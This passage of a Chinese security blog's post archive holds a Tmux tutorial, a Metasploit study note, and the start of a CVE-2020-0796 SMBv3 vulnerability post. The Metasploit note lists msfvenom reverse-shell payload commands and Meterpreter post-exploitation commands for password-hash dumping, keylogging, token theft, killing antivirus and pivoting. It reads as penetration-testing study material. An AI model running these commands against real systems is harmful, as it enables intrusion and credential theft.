../backdoor.exe ../crypted.exe</code></pre></li></ul></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/Elinpf/OSCP-survival-guide" target="_blank" rel="noopener">https://github.com/Elinpf/OSCP-survival-guide</a></p><h2 id="其他资源参考"><a href="#其他资源参考" class="headerlink" title="其他资源参考"></a>其他资源参考</h2><p><strong>1、反弹shell方法汇总</strong>：<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p><p><strong>2、linux提权方法汇总</strong>：<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p><p><strong>3、windows提权方法汇总1</strong>：<a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">https://www.fuzzysecurity.com/tutorials/16.html</a></p><p><strong>4、windows提权方法汇总2</strong>：<a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md" target="_blank" rel="noopener">https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md</a></p><p><strong>5、Linux提权辅助脚本1</strong>：<a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">https://www.securitysift.com/download/linuxprivchecker.py</a></p><p><strong>6、linux提权辅助脚本2</strong>：<a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p><strong>7、Windows提权辅助脚本</strong>：<a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/windows-privesc-check</a></p><p><strong>8、Windows提权辅助辅助工具</strong>：<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">https://github.com/bitsadmin/wesng</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux学习记录</title>
      <link href="/2020/09/01/Tmux/"/>
      <url>/2020/09/01/Tmux/</url>
      
        <content type="html"><![CDATA[<h2 id="学习使用Tmux"><a href="#学习使用Tmux" class="headerlink" title="学习使用Tmux"></a>学习使用Tmux</h2><p>我为什么要学习Tmux，我想在命令行模式下同时打开多个终端，以及如何在ssh远程连接时进行翻页，满足我的日常需求。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三处功能：</p><ul><li>丝滑分屏（split），虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。</li><li>保护现场（attach），即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。</li><li>会话共享（适用于结对编程或远程教学），将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>sudo apt-get install tmuxtmux -V # 查看版本</code></pre><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>tmux采用C/S模型构建，输入tmux命令就相当于开启了一个服务器，此时默认将新建一个会话，然后会话中默认新建一个窗口，窗口中默认新建一个面板。会话、窗口、面板之间的联系如下：</p><p>一个tmux <code>session</code>（会话）可以包含多个<code>window</code>（窗口），窗口默认充满会话界面，因此这些窗口中可以运行相关性不大的任务。</p><p>一个<code>window</code>又可以包含多个<code>pane</code>（面板），窗口下的面板，都处于同一界面下，这些面板适合运行相关性高的任务，以便同时观察到它们的运行情况。</p><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><p><strong>新建会话</strong></p><pre><code>tmux # 新建一个无名称的会话tmux new -s demo # 新建一个名称为demo的会话</code></pre><p><strong>断开当前会话</strong>，但不关闭运行的服务，是会话在后台运行。</p><pre><code>tmux detach # 断开当前会话，会话在后台运行</code></pre><p>使用快捷键组合<code>Ctrl+b</code> + <code>d</code>，三次按键就可以断开当前会话。</p><p><strong>进入之前的会话</strong></p><p>断开会话后，想要接着上次留下的现场继续工作，就要使用到tmux的attach命令了，语法为<code>tmux attach-session -t session-name</code>，可简写为<code>tmux a -t session-name</code> 或 <code>tmux a</code>。通常我们使用如下两种方式之一即可：</p><pre><code>tmux a # 默认进入第一个会话tmux a -t demo # 进入到名称为demo的会话</code></pre><p><strong>关闭会话</strong></p><p>会话的使命完成后，一定是要关闭的。我们可以使用tmux的kill命令，kill命令有<code>kill-pane</code>、<code>kill-server</code>、<code>kill-session</code> 和 <code>kill-window</code>共四种，其中<code>kill-session</code>的语法为<code>tmux kill-session -t session-name</code>。如下：</p><pre><code>tmux kill-session -t demo # 关闭demo会话tmux kill-server # 关闭服务器，所有的会话都将关闭</code></pre><p><strong>查看所有会话</strong></p><pre><code>tmux list-session # 查看所有会话tmux ls # 查看所有会话，提倡使用简写形式</code></pre><p>如果刚好处于会话中怎么办？别担心，我们可以使用对应的tmux快捷键<code>Ctrl+b</code> + <code>s</code>，此时tmux将打开一个会话列表，按上下键(⬆︎⬇︎)或者鼠标滚轮，可选中目标会话，按左右键（⬅︎➜）可收起或展开会话的窗口，选中目标会话或窗口后，按回车键即可完成切换。</p><h2 id="Tmux快捷键"><a href="#Tmux快捷键" class="headerlink" title="Tmux快捷键"></a>Tmux快捷键</h2><p>关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。前面tmux会话相关的操作中，我们共用到了两个快捷键<code>Ctrl+b</code> + <code>d</code>、<code>Ctrl+b</code> + <code>s</code>，但这仅仅是冰山一角，欲窥tmux庞大的快捷键体系，请看下表。</p><p>表一：系统指令。</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>?</code></td><td align="center">显示快捷键帮助文档</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>d</code></td><td align="center">断开当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>D</code></td><td align="center">选择要断开的会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+z</code></td><td align="center">挂起当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>r</code></td><td align="center">强制重载当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>s</code></td><td align="center">显示会话列表用于选择并切换</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>:</code></td><td align="center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>[</code></td><td align="center">进入复制模式，按<code>q</code>退出</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>]</code></td><td align="center">粘贴复制模式中复制的文本</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>~</code></td><td align="center">列出提示信息缓存</td></tr></tbody></table><p>表二：窗口（window）指令。</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>c</code></td><td align="center">新建窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>&amp;</code></td><td align="center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>0~9</code></td><td align="center">切换到指定窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>p</code></td><td align="center">切换到上一窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>n</code></td><td align="center">切换到下一窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>w</code></td><td align="center">打开窗口列表，用于且切换窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>,</code></td><td align="center">重命名当前窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>.</code></td><td align="center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>f</code></td><td align="center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table><p>表三：面板（pane）指令。</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>&quot;</code></td><td align="center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>%</code></td><td align="center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>x</code></td><td align="center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>z</code></td><td align="center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>!</code></td><td align="center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>;</code></td><td align="center">切换到最后一次使用的面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>q</code></td><td align="center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>{</code></td><td align="center">向前置换当前面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>}</code></td><td align="center">向后置换当前面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+o</code></td><td align="center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>方向键</code></td><td align="center">移动光标切换面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>o</code></td><td align="center">选择下一面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>空格键</code></td><td align="center">在自带的面板布局中循环切换</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Alt+方向键</code></td><td align="center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+方向键</code></td><td align="center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>t</code></td><td align="center">显示时钟</td></tr></tbody></table><h3 id="灵活的配置性"><a href="#灵活的配置性" class="headerlink" title="灵活的配置性"></a>灵活的配置性</h3><p>除了快捷指令外，tmux还提供了类似vim的配置性功能。可配置性是软件的一项进阶级功能，只有具备了可配置性，软件才有了鲜活的个性，用户才能体会到操作的快感。</p><p>tmux的用户级配置文件为<code>~/.tmux.conf</code>（没有的话就创建一个）</p><p>修改的<code>~/.tmux.conf</code>配置文件有如下两种方式可以令其生效：</p><ul><li>restart tmux。</li><li>在tmux窗口中，先按下<code>Ctrl+b</code>指令前缀，然后按下系统指令<code>:</code>，进入到命令模式后输入<code>source-file ~/.tmux.conf</code>，回车后生效。</li></ul><h3 id="新建窗口"><a href="#新建窗口" class="headerlink" title="新建窗口"></a>新建窗口</h3><p><code>Ctrl+b</code>+<code>c</code>新建窗口</p><p><code>Ctrl+b</code>+<code>n</code>切换到下一个窗口</p><p><code>Ctrl+b</code>+<code>p</code>切换到上一个窗口</p><p><code>Ctrl+b</code>+<code>&amp;</code>删除当前窗口，需要确认才能删除成功。</p><h3 id="新增面板"><a href="#新增面板" class="headerlink" title="新增面板"></a>新增面板</h3><p><code>Ctrl+b</code>+<code>%</code>竖直切割窗口</p><p><code>Ctrl+b</code>+<code>&quot;</code>水平切割窗口</p><p><code>Ctrl+b</code>+方向键可以选择面板</p><p><code>Ctrl+b</code>+<code>x</code>删除当前面板，需要确认才能删除成功。</p><p>tmux中，使用最多的功能之一就是新增一个面板。水平方向新增面板的指令是 <code>prefix</code> + <code>&quot;</code> ，垂直方向是 <code>prefix</code> + <code>%</code>，<code>&quot;</code> 和 <code>%</code>需要两个键同时按下才能完成，加上指令前缀至少需要3~4次按键才能组成一个完整的指令，同时这个两个键也不够醒目和方便，因此我们可以绑定两个更常用的指令 <code>-</code>、<code>|</code>，如下所示：</p><pre><code>unbind &#39;&quot;&#39;bind - splitw -v -c &#39;#{pane_current_path}&#39; # 垂直方向新增面板，默认进入当前目录unbind %bind | splitw -h -c &#39;#{pane_current_path}&#39; # 水平方向新增面板，默认进入当前目录</code></pre><h3 id="开启鼠标支持"><a href="#开启鼠标支持" class="headerlink" title="开启鼠标支持"></a>开启鼠标支持</h3><p>默认情况下，tmux的多窗口之间的切换以及面板大小调整，需要输入指令才能完成，这一过程，涉及到的指令较多，而且操作麻烦，特别是面板大小调整，指令难以一步到位，这个时候开启鼠标支持就完美了。</p><blockquote><p>tmux的用户级配置文件为<code>~/.tmux.conf</code>（没有的话就创建一个）</p><p>修改的<code>~/.tmux.conf</code>配置文件有如下两种方式可以令其生效：</p><ul><li>restart tmux。</li><li>在tmux窗口中，先按下<code>Ctrl+b</code>指令前缀，然后按下系统指令<code>:</code>，进入到命令模式后输入<code>source-file ~/.tmux.conf</code>，回车后生效。</li></ul></blockquote><p>对于tmux v2.1(2015.10.28)之前的版本，需加入如下配置：</p><pre><code>setw -g mode-mouse on # 支持鼠标选取文本等setw -g mouse-resize-pane on # 支持鼠标拖动调整面板的大小(通过拖动面板间的分割线)setw -g mouse-select-pane on # 支持鼠标选中并切换面板setw -g mouse-select-window on # 支持鼠标选中并切换窗口(通过点击状态栏窗口名称)</code></pre><p>有的地方可能会出现<code>set-window-option</code>的写法，<code>setw</code>就是它的别名。</p><p>对于tmux v2.1及以上的版本，仅需加入如下配置：</p><pre><code>set-option -g mouse on # 等同于以上4个指令的效果</code></pre><p>需要注意的是，开启鼠标支持后，iTem2默认的鼠标选中即<strong>复制功能需要同时按下 <code>Alt</code> 键</strong>，才会生效。</p><h3 id="翻页"><a href="#翻页" class="headerlink" title="翻页"></a>翻页</h3><ol><li>linux普通模式翻屏（翻页）：shift+PgUp或者shift+PgDn</li><li>tmux模型下翻屏（翻页）：Ctrl+b pageup/pagedown</li></ol><h3 id="复制模式"><a href="#复制模式" class="headerlink" title="复制模式"></a>复制模式</h3><p>tmux中操作文本，自然离不开复制模式，通常使用复制模式的步骤如下：</p><ol><li>输入 ``+[` 进入复制模式</li><li>按下 <code>空格键</code> 开始复制，移动光标选择复制区域</li><li>按下 <code>回车键</code> 复制选中文本并退出复制模式</li><li>按下 ``+]` 粘贴文本</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>踩坑记录：</p><blockquote><p>发现tmux大家介绍的不错，所以想尝试一下，但发现ctrl+b都不好使，总是不管用，经过一番努力后才发现应该是ctrl+b松开后再按其他键。例如ctrl+b ？，应该先同时按ctrl+b 松开后，shift+/（即输入？）。</p></blockquote><ol><li><p>新建会话test</p><p>tmux new -s test</p></li><li><p>新建窗口</p><p>CTRL+b+c</p></li><li><p>切换窗口</p><p>CTRL+b+p/n</p><p><img src="https://s1.ax1x.com/2020/09/01/dxJzAU.png" alt="dxJzAU.png"></p></li><li><p>新增面板，竖直切割</p><p>CTRL+b+%</p><p><img src="https://s1.ax1x.com/2020/09/01/dxYC9J.png" alt="dxYC9J.png"></p></li><li><p>水平切割</p><p>CTRL+b+“</p><p><img src="https://s1.ax1x.com/2020/09/01/dxYicR.png" alt="dxYicR.png"></p></li><li><p>翻页</p><p>CTRL+b+<code>pageup/pagedown</code></p><p><img src="https://s1.ax1x.com/2020/09/01/dxYn4e.png" alt="dxYn4e.png"></p><blockquote><p>需要注意的是，这种翻页显示的内容有限，大概能翻47页左右。所以如果查看大文件还是使用less命令。</p></blockquote></li></ol><p>能够把这些快捷键记住就能掌握tmux的基本功能了。当然，还是得经常使用才不会忘记。</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="less-命令"><a href="#less-命令" class="headerlink" title="less 命令"></a>less 命令</h3><p><code>less</code> 命令也是用于打开指定的文件并进行交互式阅读，它也支持翻页和搜索。如果文件的内容太长，也会对输出进行分页，因此也可以翻页阅读。比 <code>more</code> 命令更好的一点是，<code>less</code> 支持向上翻页和向下翻页，也就是可以在整个文件中任意阅读。</p><pre><code>/linux # 向下搜索?linux # 向上搜索</code></pre><h3 id="most-命令"><a href="#most-命令" class="headerlink" title="most 命令"></a>most 命令</h3><p><code>most</code> 同样是一个终端阅读工具，而且比 <code>more</code> 和 <code>less</code> 的功能更为丰富。<code>most</code> 支持同时打开多个文件。你可以在打开的文件之间切换、编辑当前打开的文件、迅速跳转到文件中的某一行、分屏阅读、同时锁定或滚动多个屏幕等等功能。在默认情况下，对于较长的行，<code>most</code> 不会将其截断成多行显示，而是提供了左右滚动功能以在同一行内显示。</p><pre><code>most file # 打开文件</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://louiszhai.github.io/2017/09/30/tmux/#导读" target="_blank" rel="noopener">http://louiszhai.github.io/2017/09/30/tmux/#%E5%AF%BC%E8%AF%BB</a></p><p><a href="https://www.cnblogs.com/bamanzi/p/tmux-mouse-tips.html" target="_blank" rel="noopener">https://www.cnblogs.com/bamanzi/p/tmux-mouse-tips.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Tmux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit学习记录</title>
      <link href="/2020/09/01/metasploit/"/>
      <url>/2020/09/01/metasploit/</url>
      
        <content type="html"><![CDATA[<h1 id="metasploit-学习记录"><a href="#metasploit-学习记录" class="headerlink" title="metasploit 学习记录"></a>metasploit 学习记录</h1><p><code>Metasploit</code>就是一个漏洞框架。它的全称叫做<code>The Metasploit Framework</code>，简称叫做<code>MSF</code>。<code>Metasploit</code>作为全球最受欢迎的工具，</p><p>不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>终端直接输入msfconsole</p><blockquote><p>Kali Linux 2020.1a版本msfconsole启动失败问题</p><p>由于系统默认安装的bundler为最新版本2.1.4。msfconsole依赖的版本为1.17.3，所以需要安装旧版本。执行如下命令：</p><p>root@kali:~# gem install bundler:1.17.3</p></blockquote><p><strong>初始化数据库，建立搜索缓存</strong></p><ol><li><p>首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；</p></li><li><p>初始化MSF数据库（关键步骤！）：msfdb init；</p><p><img src="https://s1.ax1x.com/2020/09/01/dxJmSs.png" alt="dxJmSs.png"></p></li><li><p>运行msfconsole：msfconsole；</p></li><li><p>在msf中查看数据库连接状态：db_status。</p><p><img src="https://s1.ax1x.com/2020/09/01/dxJGY4.png" alt="dxJGY4.png"></p></li><li><p>建立数据库缓存:<code>msfconsole db_rebuild_cache</code></p></li></ol><blockquote><p>如果执行search时，很慢，而且还提示Module database cache not build yet的话，</p><p>将数据库初始化    msfdb init </p><p>重建缓存    db_rebuild_cache    //This command is deprecated with Metasploit 5</p></blockquote><p><img src="https://s1.ax1x.com/2020/09/01/dxJste.png" alt="dxJste.png"></p><h2 id="专业术语"><a href="#专业术语" class="headerlink" title="专业术语"></a>专业术语</h2><p><code>exploit</code>就相当于是载具，将真正要负责攻击的代码传送到靶机中。</p><p><code>payload</code>也就相当于载荷。<code>exploit</code>把<code>payload</code>传送到靶机中后，<code>payload</code>就负责执行相应的攻击代码。</p><p><code>encode</code>也就是编码，它主要是为了避免之前的<code>payload</code>中出现坏字符，从而影响<code>payload</code>的功能，其次是为了实现免杀，不让杀毒软件很轻易的就发现<code>payload</code>是攻击代码。</p><pre><code>– Exploit，攻击工具/代码 – Payload，攻击载荷 – Shellcode – Module，模块 – Listener，监听器</code></pre><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><pre><code>show exploits – 查看所有可用的渗透攻击程序代码，一般用不到，了解即可。 show auxiliary – 查看所有可用的辅助攻击工具 show options – 查看该模块所有可用选项 show payloads – 查看该模块适用的所有载荷代码 show targets – 查看该模块适用的攻击目标类型search – 根据关键字搜索某模块 info – 显示某模块的详细信息 use – 进入使用某渗透攻击模块 back – 回退 set/unset – 设置/禁用模块中的某个参数 setg/unsetg – 设置/禁用适用于所有模块的全局参数 save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</code></pre><h2 id="Metasploit功能程序"><a href="#Metasploit功能程序" class="headerlink" title="Metasploit功能程序"></a>Metasploit功能程序</h2><p><code>msfvenom</code>（攻击载荷生成和编码器）</p><pre><code>主要参数：-p payload-e 编码方式-i 编码次数-o 保存payload到文件-b 在生成的程序中避免出现的值LHOST,LPORT 监听上线的主机IP和端口-f exe 生成EXE格式使用msfvenom -l 可以查看可以利用payloadmsfvenom -l | grep windows | grep x64 | grep tcp  选择payload</code></pre><p><strong>1、生成可执行文件</strong></p><pre><code>Linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeMac:msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoPHP:msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASP:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWAR:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.warPython:msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl:msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></pre><p><strong>2、监听</strong></p><pre><code>set PAYLOAD &lt;Payload name&gt;set LHOST &lt;LHOST value&gt;set LPORT &lt;LPORT value&gt;set ExitOnSession false   让connection保持连接(即使一个连接退出,仍然保持listening状态)exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)</code></pre><p><strong>3、查找攻击模块</strong></p><p><code>search cve:CVE-2012-2122</code></p><p><img src="https://s1.ax1x.com/2020/09/01/dxJh0f.png" alt="dxJh0f.png"></p><p>详细信息查看<code>search -h</code></p><p><strong>4、使用攻击模块</strong></p><p><code>use Name</code></p><p><strong>5、查看可使用的payload</strong></p><p><code>show payloads</code></p><p><strong>6、使用payload</strong></p><p><code>set payload Name</code></p><p><strong>7、查看需要设置的参数，发现需要设置一个RHOST（远程主机，即靶机的IP地址）和一个LHOST（本地主机，即攻击机的IP地址）</strong></p><p><code>show options</code></p><p><strong>8、设置完相应的参数后，再次使用<code>show options</code>对攻击的选项进行查看</strong></p><p><code>show options</code></p><p><strong>9、接着使用<code>exploit</code>指令开始攻击，攻击成功后获取了靶机的shell，使用<code>systeminfo</code>指令查看靶机系统信息</strong></p><p><code>exploit</code></p><h2 id="Meterpreter后攻击"><a href="#Meterpreter后攻击" class="headerlink" title="Meterpreter后攻击"></a>Meterpreter后攻击</h2><p><code>Meterpreter</code>提供的功能包括反追踪、纯内存工作模式、系统 信息获取、密码哈希导出、文件上传下载、屏幕截取、键盘记 录、权限提升、跳板攻击等等。</p><p>常用命令：</p><pre><code>meterpreter &gt; background  放回后台meterpreter &gt; exit  关闭会话meterpreter &gt; help  帮助信息meterpreter &gt; Sysinfo系统平台信息meterpreter &gt; screenshot  屏幕截取meterpreter &gt; shell  命令行shell (exit退出)meterpreter &gt; getlwd  查看本地目录meterpreter &gt; lcd  切换本地目录meterpreter &gt; getwd  查看目录meterpreter &gt; ls 查看文件目录列表meterpreter &gt; cd  切换目录 meterpreter &gt; rm  删除文件 meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件meterpreter &gt; search -d c:  -f *.doc  搜索文件meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 meterpreter &gt; ps  查看进程meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录meterpreter &gt; getuid  查看当前用户权限meterpreter &gt; use priv  加载特权模块meterpreter &gt; getsystem  提升到SYSTEM权限meterpreter &gt; hashdump  导出密码散列meterpreter &gt; ps   查看高权限用户PIDmeterpreter &gt; steal_token &lt;PID&gt;  窃取令牌meterpreter &gt; rev2self  恢复原来的令牌 meterpreter &gt; migrate pid  迁移进程meterpreter &gt; run killav  关闭杀毒软件 meterpreter &gt; run getgui-e  启用远程桌面meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发meterpreter &gt; run get_local_subnets  获取内网网段信息meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由meterpreter &gt; run autoroute -p  查看自动路由表创建代理通道:msf &gt; use auxiliary/server/socks4a   设置socks4代理模块msf auxiliary(socks4a) &gt; show options msf auxiliary(socks4a) &gt; run配置proxychains参数：nano /etc/proxychains.conf   修改代理监听端口,和前面端口一致quite_mode  设置成安静模式：去掉如下参数前面的注释</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/3007" target="_blank" rel="noopener">https://xz.aliyun.com/t/3007</a></p><p><a href="https://www.cnblogs.com/lxm20145215----/p/6703425.html" target="_blank" rel="noopener">https://www.cnblogs.com/lxm20145215----/p/6703425.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SMBv3远程代码执行漏洞（CVE-2020-0796）</title>
      <link href="/2020/08/28/CVE-2020-0796/"/>
      <url>/2020/08/28/CVE-2020-0796/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-0796远程代码执行漏洞"><a href="#CVE-2020-0796远程代码执行漏洞" class="headerlink" title="CVE-2020-0796远程代码执行漏洞"></a>CVE-2020-0796远程代码执行漏洞</h1><p>Microsoft SMBv3远程代码执行漏洞（CVE-2020-0796）</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>SMB通信协议是微软和英特尔在1987年制定的协议，主要是作为Microsoft网络的通讯协议。</p><p>Microsoft Server Message Block 3.1.1(SMBv3)中存在一个远程代码执行漏洞，成功利用该漏洞的攻击者可以在目标SMB服务器或SMB客户端上执行代码。该漏洞源于SMBv3协议对于特定请求的处理方式存在错误，攻击者可以在未经身份验证的情况下利用该漏洞。若要针对SMBv3服务器，攻击者可以将特制的数据包发送到SMB服务器来触发。若要针对SMBv3客户端，攻击者需要配置好一个恶意的SMB服务器，并诱使用户连接该服务器。据悉该漏洞具有蠕虫特性。</p><h2 id="受影响系统："><a href="#受影响系统：" class="headerlink" title="受影响系统："></a>受影响系统：</h2><blockquote><p>Microsoft Windows Windows Server, version 1909 (<br>Microsoft Windows Windows Server, version 1903 (<br>Microsoft Windows Windows 10 Version 1909 for x6<br>Microsoft Windows Windows 10 Version 1909 for AR<br>Microsoft Windows Windows 10 Version 1909 for 32<br>Microsoft Windows Windows 10 Version 1903 for x6<br>Microsoft Windows Windows 10 Version 1903 for AR<br>Microsoft Windows Windows 10 Version 1903 for 32</p></blockquote><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>靶机系统：win10 1903 